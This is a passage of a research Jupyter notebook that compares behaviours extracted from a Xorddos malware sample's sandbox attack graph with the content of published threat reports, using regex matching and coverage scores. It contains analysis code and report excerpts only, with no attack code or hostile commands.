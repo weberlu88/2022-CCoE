{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "import os\n",
    "from os import listdir\n",
    "from os.path import isfile, join\n",
    "from pathlib import Path\n",
    "import pandas as pd\n",
    "import pickle\n",
    "from typing import Dict, List, get_type_hints\n",
    "from styleframe import StyleFrame, Styler\n",
    "from IPython.display import display\n",
    "\n",
    "''' 自己寫的模組 '''\n",
    "from cc_regex_script import RegexMatchResult, RegexMaster \n",
    "from cc_nlp_script import find_verb_of_vocab, OperationMode, OperationEvaluator\n",
    "from cc_module_cust import AttackGraph, Node, Edge, FileTable #, build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load 所有 Dofloo 的 object，計算並儲存其 regex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "family Xorddos has numOfSample 21, first is 07c070b717a23453a2b71c7582d6a928\n",
      "samplename: ['0aefb67c01a24d05351b093455203fa2']\n"
     ]
    }
   ],
   "source": [
    "family = 'Xorddos' # Dofloo Xorddos\n",
    "\n",
    "sample_info = pd.read_csv('../../C malware info/sample_info.csv')\n",
    "dofloo_info = sample_info[(sample_info['family'] == family) & \n",
    "            (~sample_info['filename'].isin(['8845355172c485813872f1bb1834de15.bin']))]\n",
    "samplename_lst = dofloo_info['filename'].to_list()\n",
    "samplename_lst = [name.split('.')[0] for name in samplename_lst]\n",
    "print(f\"family {family} has numOfSample {len(samplename_lst)}, first is {samplename_lst[0]}\")\n",
    "\n",
    "if family == 'Dofloo':\n",
    "    samplename_lst = ['0046a78514a658b9b7a4e29e8581f85b'] # 只先使用這個 dof sample\n",
    "if family == 'Xorddos':\n",
    "    samplename_lst = ['0aefb67c01a24d05351b093455203fa2'] # 只先使用這個 xor sample\n",
    "\n",
    "print('samplename:', samplename_lst)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "{<OP act=a, obj=a>}\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "<>:23: DeprecationWarning:invalid escape sequence '\\s'\n",
      "<>:23: DeprecationWarning:invalid escape sequence '\\s'\n",
      "C:\\Users\\luweb\\AppData\\Local\\Temp\\ipykernel_22288\\1514683367.py:23: DeprecationWarning:invalid escape sequence '\\s'\n"
     ]
    }
   ],
   "source": [
    "def prettifyName(item:str) -> str:\n",
    "    pretty_name = {\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        r\"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        r\"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "    }\n",
    "    changed = pretty_name.get(item, None)\n",
    "    if changed:\n",
    "        return changed\n",
    "    return item\n",
    "\n",
    "def get_object_type(objReg: str) -> str:\n",
    "    ''' temp function, put in cc_regex_scrpt '''\n",
    "    if objReg in [r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\", \n",
    "                r\"[a-zA-z]:\\d{1,5}$\", r\"port \\d{1,5}$\",\n",
    "                r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}$\", \"eth[0-9]$\"]:\n",
    "        return 'NET'\n",
    "    if objReg in [\"0x[0-9a-zA-Z]{8}\"]:\n",
    "        return 'MEM'\n",
    "    if objReg in [\"^sed$\", \"^sh$\", \"^chkconfig$\", \"^systemctl$\", \"update-rc.d\", \"/boot/[a-z]{10}\",r\"^pipe(\\$|\\.|$)\"]:\n",
    "        return 'PROC'\n",
    "    if objReg in [r\"UID(\\$|\\.|$)\", r\"GID(\\$|\\.|$)\", \"UID\", \"GID\", \"permission(\\s|:)[0-9]{1,4}\"]:\n",
    "        return 'INFO'\n",
    "    return 'FILE'\n",
    "\n",
    "class OperationPair:\n",
    "    SYSCALL = 0\n",
    "    VERB = 1\n",
    "\n",
    "    def __init__(self, action:str, object:str, type:int=0, subject:str=None, step_number:int=None \\\n",
    "                 , original_object=None, original_sentence=None, object_type=None):\n",
    "        self.object:str = object # regex\n",
    "        self.action:str = action # verb or syscall\n",
    "        self.type:int = type # action type\n",
    "        self.object_type:str = object_type # FILE, NET, PROC, MEM, INFO\n",
    "        self.subject:str = subject\n",
    "        self.step_number:int = step_number\n",
    "        self.original_object:str = original_object # can store original matched word (object) from CTD\n",
    "        self.original_sentence:str = original_sentence # can store the mathced sentence\n",
    "        pass\n",
    "\n",
    "    def __eq__(self, other): \n",
    "        if not isinstance(other, OperationPair):\n",
    "            # don't attempt to compare against unrelated types\n",
    "            return NotImplemented\n",
    "        # Same if <action, object> pair is same (type is not consider yet)\n",
    "        return self.action == other.action and self.object == other.object\n",
    "\n",
    "    def __hash__(self) -> int:\n",
    "        # necessary for instances to behave sanely in dicts and sets.\n",
    "        return hash((self.action, self.object))\n",
    "\n",
    "    def __str__(self) -> str:\n",
    "        if self.step_number:\n",
    "            return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "        return f\"<OP act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "    def __repr__(self) -> str:\n",
    "        return str(self)\n",
    "    def getSentStr(self) -> str:\n",
    "        '''return string contains original_object & flat_sentence'''\n",
    "        flat_sentence = \" \".join(self.original_sentence.splitlines())\n",
    "        return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.original_object)}, sent={flat_sentence}>\"\n",
    "        \n",
    "# test case\n",
    "p_aa = OperationPair('a','a')\n",
    "p_aaz = OperationPair('a','a')\n",
    "p_ab = OperationPair('a','b')\n",
    "\n",
    "print(p_aa == p_aaz) # True\n",
    "print(set([p_aa, p_aaz])) # one element\n",
    "\n",
    "def construct_sample_OPset(step_list: list, keep_src_node=False, debug=False, rt_order=True) -> set:\n",
    "    '''return a list of OPset. RegexMaster and family are gobal variable.'''\n",
    "    if debug:\n",
    "        print('step_list len:', len(set(step_list)))\n",
    "    OPlst_raw = list((src_node.name, dst_node.name, syscall) for (src_node, dst_node, syscall) in step_list) # object is raw\n",
    "    OPset_raw = list(dict.fromkeys(OPlst_raw))\n",
    "    if debug:\n",
    "        print('OPlst_raw len:', len(OPlst_raw)) # why len is 123100? (while step_list len is 7775) (must be equal)\n",
    "        print(f\"OPlst_raw: {OPlst_raw[:10]}\")\n",
    "        print('OPset_raw len:', len(OPset_raw)) # len is 5925 for xor\n",
    "        print(f\"OPset_raw: {OPset_raw[:10]}\")\n",
    "    regexMaster = RegexMaster(familyname=family)\n",
    "    regex_pool = regexMaster.get_all_regex()\n",
    "    OPset = set()\n",
    "    OPset_ordered = list()\n",
    "    for (src_node, dst_node, syscall) in OPset_raw:\n",
    "        regex_dst_node_list = RegexMaster.find_spacial_token_with_regex(regex_pool, dst_node)\n",
    "        if regex_dst_node_list is None or len(regex_dst_node_list) == 0:\n",
    "            continue\n",
    "        for regex_result in regex_dst_node_list:\n",
    "            dst_node = regex_result.match_regex\n",
    "            step_number = len(OPset) + 1\n",
    "            if keep_src_node:\n",
    "                op = OperationPair(syscall, dst_node, subject=src_node, step_number=step_number)\n",
    "                OPset.add(op) # keep src_node in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "            else:\n",
    "                op = OperationPair(syscall, dst_node, step_number=step_number)\n",
    "                OPset.add(op) # only dst_node, syscall in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "    if debug:\n",
    "        print('OPset len:', len(OPset), 'OPset_ordered len:', len(OPset_ordered))\n",
    "    if rt_order:\n",
    "        return OPset, OPset_ordered\n",
    "    return OPset\n",
    "\n",
    "# def construct_sample_stepList(step_list: list, keep_src_node=False, debug=False) -> list:\n",
    "#     ''''''\n",
    "#     pass\n",
    "\n",
    "# test\n",
    "# sample_OPset = construct_sample_OPset(asg.step_list, debug=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exam: sample S1 matches 31 of regex\n",
      "Size of regex_pool: 31, size of total_used_regex: 0\n"
     ]
    }
   ],
   "source": [
    "class Sample:\n",
    "    def __init__(self, samplename:str, regex_set:set=None, special_token_dict=None, step_list=None) -> None:\n",
    "        self.samplename: str = samplename\n",
    "        self.regex_set: set = set()\n",
    "        if regex_set:\n",
    "            self.regex_set = regex_set\n",
    "        self.special_token_dict = {}\n",
    "        if special_token_dict:\n",
    "            self.special_token_dict: dict = special_token_dict # list of dict\n",
    "        if step_list:\n",
    "            self.step_list = step_list\n",
    "            OPset, OPset_ordered = construct_sample_OPset(step_list)\n",
    "            self.OPset: set[OperationPair] = OPset\n",
    "            self.OPset_ordered: list[OperationPair] = OPset_ordered # 依照出現順序排序的 OPset (元素相同順序不同)\n",
    "            self.OPset_sysOnly_ordered = [] # 尚未初始化 只儲存改變系統狀態的 OP 的物件\n",
    "            self.OPset_sysOnly_ordered_index = [] # 尚未初始化 只儲存改變系統狀態的 OP 的 index\n",
    "            del OPset, OPset_ordered\n",
    "        pass\n",
    "    def __repr__(self) -> str:\n",
    "        return f\"<Sample self.samplename>\"\n",
    "\n",
    "''' 讀取 ASG 中的 set_of_object (就是這個樣本的 special_token_dict)，並歸納樣本的 regex_set '''\n",
    "regexMaster = RegexMaster(familyname=family)\n",
    "regex_pool = regexMaster.get_all_regex()\n",
    "# total_used_regex = set()\n",
    "samples: list[Sample] = []\n",
    "for samplename in samplename_lst:\n",
    "    with open(f'../../C ASG statistics 1115ver/saved_pkl/{family}/{samplename}.pkl', 'rb') as inp:\n",
    "        asg: AttackGraph = pickle.load(inp) # asg.set_of_object is dict() (key:spacial token, value: type 首字大寫)\n",
    "        sample = Sample(samplename, special_token_dict=asg.set_of_object, step_list=asg.step_list)\n",
    "        sample.regex_set = set(regex_pool) # 直接使用志剛寫的作為這個樣本的 baseline\n",
    "        # for obj in sample.special_token_dict.keys():\n",
    "        #     matched_list: list[RegexMatchResult] = regexMaster.find_spacial_token(obj)\n",
    "        #     if matched_list:\n",
    "        #         # print(obj, matched_list)\n",
    "        #         [sample.regex_set.add(m.match_regex) for m in matched_list]\n",
    "        #         # [total_used_regex.add(m.match_regex) for m in matched_list]\n",
    "        # print('------', sample.regex_set)\n",
    "        # break\n",
    "        samples.append(sample)\n",
    "    # del asg\n",
    "print(f'Exam: sample S1 matches {len(samples[0].regex_set)} of regex')\n",
    "print(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "set()"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 只差這四個不在 asg set_of_object 中 {'0x[0-9a-zA-Z]{8}', 'GID', 'UID', 'port \\\\d{1,5}$'}\n",
    "set(regex_pool) - samples[0].regex_set"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' Save result to txt file 沒事不要 run ! '"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''' Save result to txt file 沒事不要 run ! '''\n",
    "# total_regex = set()\n",
    "# with open('./result/countof_regexset.txt', 'w', encoding='utf-8') as opf:\n",
    "#     # header\n",
    "#     opf.write('{:12s}'.format('Sample no.'))\n",
    "#     for i in range(len(samples)):\n",
    "#         if i+1 < 10:\n",
    "#             opf.write(f' S{i+1} ')\n",
    "#         else:\n",
    "#             opf.write(f'S{i+1} ')\n",
    "#     opf.write('\\n')\n",
    "#     # opf.write('{:12s}'.format('# of regex'))\n",
    "#     num_of_regex_string = '{:12s}'.format('# of regex')\n",
    "#     num_of_objects_string = '{:12s}'.format('# of object ') # 所有的類別喔! 無過濾\n",
    "#     for i in range(len(samples)):\n",
    "#         # opf.write(f'{len(samples[i].regex_set):>3} ')\n",
    "#         num_of_regex_string += f'{len(samples[i].regex_set):>3} '\n",
    "#         num_of_objects_string += f'{len(samples[i].special_token_dict):>3} '\n",
    "#     opf.write(num_of_objects_string+'\\n')\n",
    "#     opf.write(num_of_regex_string)\n",
    "#     opf.write('\\n{:12s}'.format('Sample hash'))\n",
    "#     for i in range(len(samples)):\n",
    "#         opf.write(f'{samples[i].samplename[:3]:>3} ')\n",
    "#     opf.write('\\n\\n')\n",
    "#     opf.write(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}\\n\\n')\n",
    "\n",
    "#     # content of each sample\n",
    "#     for i,s in enumerate(samples):\n",
    "#         content_1 = f\"S{i+1} has {len(s.regex_set)} of regex\\n\"\n",
    "#         content_2 = f\"regex_set: {s.regex_set}\\n\"\n",
    "#         content_3 = f\"special_token_dict: {s.special_token_dict.keys()}\\n\"\n",
    "#         opf.writelines([content_1, content_2, content_3])\n",
    "#         opf.write('\\n\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load Reports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Xorddos-Cdnetworks.csv',\n",
       " 'Xorddos-Crowdstrike.csv',\n",
       " 'Xorddos-Intezer.csv',\n",
       " 'Xorddos-Ms.csv',\n",
       " 'Xorddos-Trendmicro.csv',\n",
       " 'Xorddos-Trendmicro2.csv']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_fir_path = '../../C parse report/sentence csvs/'\n",
    "# family, samplename, outputfolder = 'Xorddos', '???', './result'\n",
    "outputfolder = './result'\n",
    "\n",
    "def get_all_filenames(dir: str='./') -> list:\n",
    "    ''' traverse root directory, and list directories as dirs and files as files. Return filenames in rootdir. '''\n",
    "    files = [f for f in listdir(dir) if isfile(join(dir, f))]\n",
    "    files.sort()\n",
    "    return files\n",
    "\n",
    "xor_report_names = [f for f in get_all_filenames(report_fir_path) if f.startswith(family)] # 只選擇這個家族的報告\n",
    "xor_report_dfs = [pd.read_csv(f\"{report_fir_path}{f}\") for f in xor_report_names]\n",
    "xor_report_names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Number</th>\n",
       "      <th>Content</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Sentence 1</td>\n",
       "      <td>understanding a xor.ddos attack\\n2月 17, 2021\\n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Sentence 2</td>\n",
       "      <td>xor.ddos is the name of the malware, not the a...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Sentence 3</td>\n",
       "      <td>it was detected in september 2014 and the anal...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Sentence 4</td>\n",
       "      <td>is a distributed denial-of-service attack from...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Sentence 5</td>\n",
       "      <td>in many ways it is and in this guide, we will ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Sentence 6</td>\n",
       "      <td>what is xor.ddos malware?</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Sentence 7</td>\n",
       "      <td>the traditional attack utilized the existing v...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Sentence 8</td>\n",
       "      <td>however, xor.ddos makes windows pcs into zombi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Sentence 9</td>\n",
       "      <td>the xor.ddos attack is used to defeat the netw...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Sentence 10</td>\n",
       "      <td>this is a very serious threat to the network b...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Sentence 11</td>\n",
       "      <td>in addition to these primary targets, the udp ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Sentence 12</td>\n",
       "      <td>however, the xor.ddos attack uses the tcp, whi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Sentence 13</td>\n",
       "      <td>a brute force attack tries many random passwor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>Sentence 14</td>\n",
       "      <td>there are various types of brute force attacks...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>Sentence 15</td>\n",
       "      <td>origin of xor.ddos attacks\\n77.1 % of xor.ddos...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>Sentence 16</td>\n",
       "      <td>many large-scale cloud service providers were ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>Sentence 17</td>\n",
       "      <td>in addition, as ssh services (22/tcp) are bein...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>Sentence 18</td>\n",
       "      <td>countermeasures against xor.ddos attacks\\nthe ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>Sentence 19</td>\n",
       "      <td>syn is just a process to perform a 3-way hands...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>Sentence 20</td>\n",
       "      <td>if syn packets with data are detected, the xor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>Sentence 21</td>\n",
       "      <td>in addition, it is good to use a syn cookie ag...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>Sentence 22</td>\n",
       "      <td>the syn cookie blocks syn spoofing effectively...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>Sentence 23</td>\n",
       "      <td>the syn cookie does not require a certain time...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>Sentence 24</td>\n",
       "      <td>therefore, the syn cookie is a very effective ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>Sentence 25</td>\n",
       "      <td>alternatively, first syn drop can be a second ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>Sentence 26</td>\n",
       "      <td>this technique works by saving the first syn p...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>Sentence 27</td>\n",
       "      <td>if the session request is normal, the same ip ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>Sentence 28</td>\n",
       "      <td>if the request is made for attack, another syn...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>Sentence 29</td>\n",
       "      <td>conclusion – get a ddos mitigation service\\na ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>Sentence 30</td>\n",
       "      <td>the content delivery network industry can prov...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>Sentence 31</td>\n",
       "      <td>as the services are cloud-based, the available...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>Sentence 32</td>\n",
       "      <td>with these services, most companies will benef...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Number                                            Content\n",
       "0    Sentence 1  understanding a xor.ddos attack\\n2月 17, 2021\\n...\n",
       "1    Sentence 2  xor.ddos is the name of the malware, not the a...\n",
       "2    Sentence 3  it was detected in september 2014 and the anal...\n",
       "3    Sentence 4  is a distributed denial-of-service attack from...\n",
       "4    Sentence 5  in many ways it is and in this guide, we will ...\n",
       "5    Sentence 6                          what is xor.ddos malware?\n",
       "6    Sentence 7  the traditional attack utilized the existing v...\n",
       "7    Sentence 8  however, xor.ddos makes windows pcs into zombi...\n",
       "8    Sentence 9  the xor.ddos attack is used to defeat the netw...\n",
       "9   Sentence 10  this is a very serious threat to the network b...\n",
       "10  Sentence 11  in addition to these primary targets, the udp ...\n",
       "11  Sentence 12  however, the xor.ddos attack uses the tcp, whi...\n",
       "12  Sentence 13  a brute force attack tries many random passwor...\n",
       "13  Sentence 14  there are various types of brute force attacks...\n",
       "14  Sentence 15  origin of xor.ddos attacks\\n77.1 % of xor.ddos...\n",
       "15  Sentence 16  many large-scale cloud service providers were ...\n",
       "16  Sentence 17  in addition, as ssh services (22/tcp) are bein...\n",
       "17  Sentence 18  countermeasures against xor.ddos attacks\\nthe ...\n",
       "18  Sentence 19  syn is just a process to perform a 3-way hands...\n",
       "19  Sentence 20  if syn packets with data are detected, the xor...\n",
       "20  Sentence 21  in addition, it is good to use a syn cookie ag...\n",
       "21  Sentence 22  the syn cookie blocks syn spoofing effectively...\n",
       "22  Sentence 23  the syn cookie does not require a certain time...\n",
       "23  Sentence 24  therefore, the syn cookie is a very effective ...\n",
       "24  Sentence 25  alternatively, first syn drop can be a second ...\n",
       "25  Sentence 26  this technique works by saving the first syn p...\n",
       "26  Sentence 27  if the session request is normal, the same ip ...\n",
       "27  Sentence 28  if the request is made for attack, another syn...\n",
       "28  Sentence 29  conclusion – get a ddos mitigation service\\na ...\n",
       "29  Sentence 30  the content delivery network industry can prov...\n",
       "30  Sentence 31  as the services are cloud-based, the available...\n",
       "31  Sentence 32  with these services, most companies will benef..."
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor_report_dfs[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單篇文章的 Class 和 整個 Family 的 Class\n",
    "`baseline: Dict[str, list]` 改為 `regexMaster: RegexMaster`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "class ReportEvalModel:\n",
    "    def __init__(self, regex_set: set, sentences: pd.DataFrame, reportname:str=''):\n",
    "        self.regex_pool: set[str] = regex_set # 樣本or家族含有的 regex 集合\n",
    "        self.sentences = sentences # a df\n",
    "        self.reportname = reportname\n",
    "        cols = list(regex_pool)\n",
    "        self.match_tbl = pd.DataFrame([[0]*len(cols)]*len(sentences), columns=cols)\n",
    "        self.match_word:dict[(int,str), str] = dict() # key(idx_sent,regex) value(word:str)\n",
    "        self.match_regex = set()\n",
    "        self.doc_OPset:set[OperationPair] = set() # Set of doc's OperationalPair\n",
    "        self.match_doc_OPset:set[OperationPair] = set()\n",
    "        self.OPset_order_index = [] # 紀錄 ASG OP 的出現順序 (lifecycle)\n",
    "        self.SysOPset_order_index = [] # 只紀錄改變系統的\n",
    "        # self.asgSysOPset_order_index = []\n",
    "        # self.regexMaster = regexMaster # 其實應該用 class function 就不用傳入一個物件\n",
    "        self.match()\n",
    "\n",
    "    def match(self) -> None:\n",
    "        '''find baseline in sentences of report. Fill matching result in self.match_tbl.'''\n",
    "        sentence_list = self.sentences['Content']\n",
    "        for idx_sent, sent in enumerate(sentence_list):\n",
    "            # print(idx_sent, sent)\n",
    "            # find regexs in a sentence\n",
    "            matched_list: list[RegexMatchResult] = RegexMaster.find_spacial_token_with_regex(self.regex_pool, sent)\n",
    "            if not matched_list:\n",
    "                continue\n",
    "            for m in matched_list:\n",
    "                this_re = m.match_regex\n",
    "                matched_word = m.word\n",
    "                # print(matched_word, '|',sent[:10])\n",
    "                self.match_word[(idx_sent,this_re)] = m.word # 紀錄被 search 到的單字\n",
    "                # self.match_tbl.loc[idx_sent,this_re] = 1 # mark as found 節省空間\n",
    "                self.match_regex.add(this_re)\n",
    "                en_verb = find_verb_of_vocab(sent, m.word)\n",
    "                # print(f\"---\\nen_verb: {en_verb}, m.word: {m.word}, sent: {sent}\") # 列印所有動詞抓取情形\n",
    "                stepn = len(self.doc_OPset) + 1\n",
    "                # 如果 action 和 matched regex 相同，即使報告中object的原字串不同，也不會多計入。\n",
    "                if en_verb:\n",
    "                    self.doc_OPset.add(OperationPair(en_verb, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                    step_number=stepn, original_sentence=sent, object_type=get_object_type(this_re))) # has verb\n",
    "                else:\n",
    "                    self.doc_OPset.add(OperationPair(None, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                                                     step_number=stepn, object_type=get_object_type(this_re))) # no verb\n",
    "        pass\n",
    "    \n",
    "    def get_match_sentences(self) -> pd.DataFrame:\n",
    "        result = self.match_tbl.copy()\n",
    "        result['match'] = result.sum(axis=1)\n",
    "        return result\n",
    "    \n",
    "    def get_match_regexs(self) -> set:\n",
    "        return self.match_regex\n",
    "\n",
    "    def get_match_word(self, idx_sent:int, regex:str) -> str:\n",
    "        return self.match_word[(idx_sent, regex)]\n",
    "\n",
    "class FamilySet:\n",
    "    '''一個 malware family report 集合'''\n",
    "    def __init__(self, familyname:str, regexMaster: RegexMaster, sample: Sample=None):\n",
    "        self.familyname = familyname\n",
    "        self.regexMaster = regexMaster\n",
    "        self.num_of_used_regex = len(regexMaster.used_regex_set) # 這個家族含規則的總數量 (unoin by all samples)\n",
    "        self.sample = None\n",
    "        if sample:\n",
    "            self.sample = sample\n",
    "            self.num_of_used_regex = len(sample.regex_set) # 改以這個樣本規則的總數量為基準\n",
    "        self.rem_lst: List[ReportEvalModel] = [] # list of ReportEvalModel under this family\n",
    "        self.result_tbl = None\n",
    "\n",
    "    def add_rem(self, sentences: pd.DataFrame, reportname: str=''):\n",
    "        '''新增 report 到 FamilySet 中，需傳入文本和報告名稱，會沿用 FamilySet 的 baseline.'''\n",
    "        if self.sample:\n",
    "            rem = ReportEvalModel(list(self.sample.regex_set), sentences, reportname) # 基準是 Sample\n",
    "            self.rem_lst.append(rem)\n",
    "            return\n",
    "        rem = ReportEvalModel(self.regexMaster, sentences, reportname) # 基準是 Family union # need fix -> no first arg now\n",
    "        self.rem_lst.append(rem)\n",
    "\n",
    "    def calc_report_coverage_score(self, match_regexs: list[str], apply_weight=False) -> float:\n",
    "        '''計算這篇報告的 coverage_score，未處理分母為0之情形'''\n",
    "        if not apply_weight:\n",
    "            return len(match_regexs) / self.num_of_used_regex # 無權種的算法，分母是家族 wide\n",
    "        ''' 以下 有權重的算法尚未修改，必出 bug '''\n",
    "        # denominator = sum(self.regexMaster['weight']) # 分母\n",
    "        # numerator = 0 # 分子\n",
    "        # for b, w in zip(self.regexMaster['text'], self.regexMaster['weight']):\n",
    "        #     if b in match_baselines:\n",
    "        #         numerator += w\n",
    "        # return numerator/denominator\n",
    "\n",
    "    def show_result(self, apply_weight: bool=False, base_on_sample = True):\n",
    "        '''print and return result table. baselinse(x) * report(y).'''\n",
    "        column_names = ['report_name','ttl_match','coverage_score']\n",
    "        if base_on_sample:\n",
    "            column_names.extend(list(self.sample.regex_set))\n",
    "        else:\n",
    "            column_names.extend(list(regexMaster.used_regex_set))\n",
    "        result_tbl = pd.DataFrame([[0]*len(column_names)]*len(self.rem_lst), columns=column_names)\n",
    "        for i,rem in enumerate(self.rem_lst):\n",
    "            match_regexes = rem.get_match_regexs() # 這篇報告含有哪些 baseine:set\n",
    "            c_score = self.calc_report_coverage_score(match_regexes, apply_weight=apply_weight)\n",
    "            result_tbl.loc[i,'report_name'] = rem.reportname\n",
    "            result_tbl.loc[i,'ttl_match'] = len(match_regexes)\n",
    "            result_tbl.loc[i,'coverage_score'] = f'{c_score:.4}'\n",
    "            for b in match_regexes:\n",
    "                result_tbl.loc[i,b] = 1\n",
    "            print(rem.reportname, match_regexes)\n",
    "        display(result_tbl)\n",
    "        return result_tbl"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: 存檔每篇報告的 matched sentence (以樣本的 regex set 為基準)\n",
    "比較樣本間的辨別度，有 n 個樣本，就會跑 n 變，得出 n 個結果 (FanilySet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, psutil\n",
    "def print_mem_usage():\n",
    "    process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    print(f\"=== mem_usage: {mem_usage:.2f} MB ===\")  # in MiB \n",
    "\n",
